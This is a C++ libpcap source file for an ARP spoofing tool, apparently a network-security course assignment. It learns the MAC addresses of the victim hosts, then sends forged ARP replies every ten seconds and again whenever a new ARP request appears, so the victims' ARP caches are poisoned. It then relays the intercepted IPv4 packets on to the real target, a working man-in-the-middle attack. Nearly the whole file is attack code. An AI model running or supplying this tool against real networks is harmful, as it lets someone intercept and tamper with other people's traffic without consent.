#include <cstdio>
#include <pcap.h>
#include<sys/socket.h>
#include<sys/ioctl.h>
#include<net/if.h>
#include<arpa/inet.h>
#include<thread>
#include<vector>
#include<unistd.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "iphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
struct EthIpPacket final {
	EthHdr eth_;
	IpHdr ip_;
};
#pragma pack(pop)

struct info final{
	Ip sip;
	Mac smac;
	Ip tip;
	Mac tmac;
};

bool getMyInfo(char* dev, Ip* MyIp, Mac* myMac)
{
    	char mac[32];
    	struct ifreq ifr;
    	int sock = socket(PF_INET, SOCK_STREAM, 0);

    	if(sock==-1) {
        	printf("Error : socket failed\n");
        	return false;
    	}

    	strncpy(ifr.ifr_name, dev, sizeof(ifr.ifr_name)-1);
    	ifr.ifr_name[sizeof(ifr.ifr_name)-1]='\0';

    	if(ioctl(sock, SIOCGIFADDR, &ifr)==-1) {
        	printf("Error : IP error\n");
        	return false;
    	}
    	*MyIp=Ip(inet_ntoa(((struct sockaddr_in *)(&ifr.ifr_netmask))->sin_addr));

    	if(ioctl(sock, SIOCGIFHWADDR, &ifr)==-1) {
        	printf("Error : MAC error\n");
        	return false;
    	}
    	for(int i=0, k=0; i<6; i++) {
        	k += snprintf(mac+k, sizeof(mac)-k-1, i ? ":%02x" : "%02x", (int)(unsigned int)(unsigned char)ifr.ifr_hwaddr.sa_data[i]);
    	}
    	mac[sizeof(mac)-1]='\0';
    	*myMac=Mac(mac);

    	return true;
}

bool sendArp(pcap_t* handle, Ip sip, Ip tip, Mac sMac, Mac tMac, uint8_t op)
{

    	EthArpPacket packet;

    	packet.eth_.dmac_ = tMac;
    	packet.eth_.smac_ = sMac;
    	packet.eth_.type_ = htons(EthHdr::Arp);

    	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    	packet.arp_.pro_ = htons(EthHdr::Ip4);
    	packet.arp_.hln_ = Mac::SIZE;
    	packet.arp_.pln_ = Ip::SIZE;
    	packet.arp_.op_ = htons(op);
    	packet.arp_.smac_ = sMac;
    	packet.arp_.sip_ = htonl(sip);
    	if(op==ArpHdr::Request)
        	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    	else packet.arp_.tmac_ = tMac;
    	packet.arp_.tip_ = htonl(tip);


    	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    	if (res != 0) {
        	printf( "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        	return false;
    	}
    	return true;
}

Mac recv_mac(pcap_t* handle, Ip sip)
{
	Mac sMac;
	const u_char* packet;
        struct pcap_pkthdr* header;

        while(true) { //finding Arp reply
		int res=pcap_next_ex(handle, &header, &packet);
                if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
                	printf("pcap_next_ex return %d\n", res);
			continue;
		}
                
		EthArpPacket* EApacket=(EthArpPacket*)packet;

		if(ntohs(EApacket->eth_.type_) != EthHdr::Arp) {
			continue;
		}
		else if(ntohs(EApacket->arp_.op_) != ArpHdr::Reply) {
			continue;
		}
		else if(ntohl(EApacket->arp_.sip_) != sip) {
			continue;
		}
		sMac=Mac(EApacket->eth_.smac_);
		return sMac;
	}
}

void infect(pcap_t* handle, info tmp, Mac myMAC) 
{
	while(true) {
		if(!sendArp(handle, tmp.tip, tmp.sip, myMAC, tmp.smac, ArpHdr::Reply)) {
			printf("infect failed\n");
			return;
		}
		sleep(10);
	}
}


void usage() {
   	printf("syntax : arp-spoof <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int main(int argc, char* argv[]) {
    	if (argc < 4 || argc%2 == 1 ) {// input : 2n+1 argument
		usage();
		return -1;
	}
	
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
    	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

    	Ip myIP;
	Mac myMAC;
    	if(!getMyInfo(dev, &myIP, &myMAC)) {
       		return -1;
    	}

    	printf("IP : %s\nMAC : %s\n", std::string(myIP).c_str(), std::string(myMAC).c_str());

	std::vector<info> info_vec;
	info temp_input;

	for(int i=2; i<argc; i+=2) {
		temp_input.sip = Ip(argv[i]);
		temp_input.tip = Ip(argv[i+1]);
		
		if(!sendArp(handle, myIP, temp_input.sip, myMAC, Mac("ff:ff:ff:ff:ff:ff"), ArpHdr::Request )) {
                        printf("Error sending arp, skip %d \n", i/2);
                        continue;
                }			
		temp_input.smac = recv_mac(handle, temp_input.sip);
		
		if(!sendArp(handle, myIP, temp_input.tip, myMAC, Mac("ff:ff:ff:ff:ff:ff"), ArpHdr::Request )) {
                        printf("Error sending arp, skip %d \n", i/2);
                        continue;
                }
		temp_input.tmac = recv_mac(handle, temp_input.tip);
		
		info_vec.push_back(temp_input);
	}
	
	for(auto i:info_vec) {
		std::thread infect_thread(infect,handle,i,myMAC);
		infect_thread.detach();
	}
	
	printf("capture start!\n");
	while(true) {
		//get packet (from pcap-test)
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet); 

		if(res==0) continue;
		if(res==PCAP_ERROR || res==PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		
		EthHdr* ethhdr = (EthHdr*) packet;
		
		for(auto dat:info_vec) {
			if(ethhdr->smac_!=dat.smac) continue;
			if(ethhdr->type() == EthHdr::Arp) {
				EthArpPacket* EApkt = (EthArpPacket*) packet;
				sendArp(handle, dat.tip, dat.sip, myMAC, dat.smac, ArpHdr::Reply);
			}

			if(ethhdr->type() == EthHdr::Ip4) {
				EthIpPacket* EIpkt = (EthIpPacket*) packet;
				EIpkt->eth_.smac_ = myMAC;
			       	EIpkt->eth_.dmac_ = dat.tmac;
				if(pcap_sendpacket(handle, (const u_char*)EIpkt, sizeof(EthHdr)+ntohs(EIpkt->ip_.plen_))) {
					printf("Error : Relay IP Packet\t%s\n", pcap_geterr(handle));
				}

			}

		}
		



	}
	

	pcap_close(handle);
}
